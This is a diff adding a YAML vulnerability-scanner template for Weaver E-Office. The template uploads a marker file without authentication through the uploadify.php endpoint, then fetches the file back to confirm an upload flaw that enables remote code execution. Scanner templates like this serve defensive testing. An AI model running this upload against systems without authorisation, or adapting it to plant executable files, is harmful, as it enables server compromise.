@@ -1,0 +1,23 @@
+name: poc-yaml-eoffice-uploadify-rce
+rules:
+    - method: POST
+      path: /inc/jquery/uploadify/uploadify.php
+      headers:
+          Content-Type: multipart/form-data; boundary=---------------------------376008651130158601163945320856
+      body: "\r\n-----------------------------376008651130158601163945320856\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"1314520.txt\"\r\nContent-Type: image/png\r\n\r\n1314520\r\n-----------------------------376008651130158601163945320856--"
+      expression: |
+        response.status == 200
+      search: >-
+        (?P<filen>([a-zA-Z0-9]{10}))
+    - method: GET
+      path: /attachment/{{filen}}/1314520.txt
+      follow_redirects: false
+      expression: |
+        response.status == 200 && response.body.bcontains(b'1314520')
+        
+detail:
+    author: eoffice-uploadify-rce
+    links:
+        - https://www.baidu.com
+        - app="泛微-EOffice"
+
